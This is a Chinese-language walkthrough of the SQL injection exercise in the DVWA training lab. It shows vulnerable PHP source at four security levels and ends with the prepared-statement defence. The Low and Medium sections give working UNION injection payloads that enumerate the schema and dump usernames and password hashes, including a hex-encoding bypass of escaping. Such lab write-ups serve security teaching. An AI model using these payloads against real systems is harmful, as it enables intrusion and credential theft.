	**SQL注入**：SQL注入就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数下入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。


## 1、Low
**查看源码**
```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '
<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "
<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

通过代码我们可以看到并没有对用户所输入的数据做任何的判断就直接带入到数据库的查询语句中，并返回“firstname”，“lastname”。

通过看源码我们可以知道可以使用`'`来闭合前面的`'`，用`#`来注释掉后面的内容，来进行注入。而且可以看到有两个可以返回的字段。

**实战**<br />使用union注入查看当前数据库和用户名，可以看到数据库为dvwa，用户为root
```sql
-1' union select database(),user() #
```
![image-20210414141529809.png](./assets/1655879469217-cbc1fa99-774f-4599-80da-851be591a020.png)

查看dvwa数据库中的表，可以看到有两个表guestbook和users。
```sql
-1' union select user(),group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
```
![image-20210414142434754.png](./assets/1655879481163-4b32eb9b-aa4b-4180-9f03-706a2d24dc4e.png)

查看users中的字段
```sql
-1' union select user(),group_concat(column_name) from information_schema.columns where table_name='users'#
```
![image-20210414142705424.png](./assets/1655879486720-2978702c-296f-4881-8987-f0d03bbf4cdd.png)

查看user，和password,得到账户和密码的MD5
```sql
-1' union select user(),group_concat(concat_ws('-',user,password)) from dvwa.users#
```
![image-20210414143100602.png](./assets/1655879491383-ac73da71-2d8e-4209-82fe-b4d7f7787852.png)

解密得到密码<br />![image-20210414143459141.png](./assets/1655879496709-180b0570-34d6-4771-a2e3-35ae59db00b2.png)


## 2、Medium
**查看源码**
```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '
<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "
<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '
<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

**函数说明**
```
定义和用法
mysqli_real_escape_string（）函数转义在SQL语句中使用的字符串中的特殊字符。

语法
mysqli_real_escape_string(connection,escapestring);
connection:必需。规定要使用的 MySQL 连接。
escapestring:必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z。
```

在这里使用了mysqli_real_escape_string（）转义一些特殊字符，也就是说我们不能使用像Low中的`'1#`,不过我们可以使用`and 1=2`来进行注入，不需要进行过滤。而且可以看到这里是以表单的形式来然我们提交，web页面参数不可控，所以需要使用burp来抓包重放。修改参数id即可。<br />![image-20210414151316663.png](./assets/1655879514109-e11ff2dc-59df-4aa8-bd30-0b14157826e4.png)

**实战**<br />查看当前用户和数据库
```
1 and 1=2 union select user(),database()
```
![image-20210414150447028.png](./assets/1655879521177-5cd1c09a-484d-452a-a62f-92bc6a498faf.png)

查看dvwa表中的字段,因为将`'`和`"`进行了转义无法使用，所以在这里我将dvwa转为ascii十六进制0x64767761
```
1 and 1=2 union select user(),group_concat(table_name) from information_schema.tables where table_schema=0x64767761
```
![image-20210414151255002.png](./assets/1655879526097-5ee164e4-df7b-4aea-b60b-03621cf07397.png)

查看users表中的字段
```
1 and 1=2 union select user(),group_concat(column_name) from information_schema.columns where table_name=0x7573657273
```
![image-20210414151605836.png](./assets/1655879531087-73297807-95e1-430e-bade-a2c0c02c8b29.png)

查看user和password
```
1 and 1=2 union select user(),group_concat(	concat_ws(0x2d,user,password)) from dvwa.users
```
![image-20210414151954881.png](./assets/1655879536619-5540cf6b-dfaf-4079-a328-1ff61bd448b0.png)

解密得到密码<br />![image-20210414143459141.png](./assets/1655879540443-9d2c4429-ab9f-4604-9e0a-3ab11f6c1892.png)


## 3、High
**查看源码**
```php
<?phpif( isset( $_SESSION [ 'id' ] ) ) {    // Get input    $id = $_SESSION[ 'id' ];    // Check database    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '
<pre>Something went wrong.</pre>' );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Get values        $first = $row["first_name"];        $last  = $row["last_name"];        // Feedback for end user        echo "
<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        }?>
```

通过源码可以看到就是在Low的基础上在sql语句后面加了一个LIMIT 1，希望以此控制只输出一个结果。但是我们还是可以通过#将其注释掉。

以下步骤与Low相同，不进行叙述。


## 4、Impossible
**查看源码**
```php
<?phpif( isset( $_GET[ 'Submit' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $id = $_GET[ 'id' ];    // Was a number entered?    if(is_numeric( $id )) {        // Check the database        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );        $data->bindParam( ':id', $id, PDO::PARAM_INT );        $data->execute();        $row = $data->fetch();        // Make sure only 1 result is returned        if( $data->rowCount() == 1 ) {            // Get values            $first = $row[ 'first_name' ];            $last  = $row[ 'last_name' ];            // Feedback for end user            echo "
<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";        }    }}// Generate Anti-CSRF tokengenerateSessionToken();?>
```

通过源码可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。
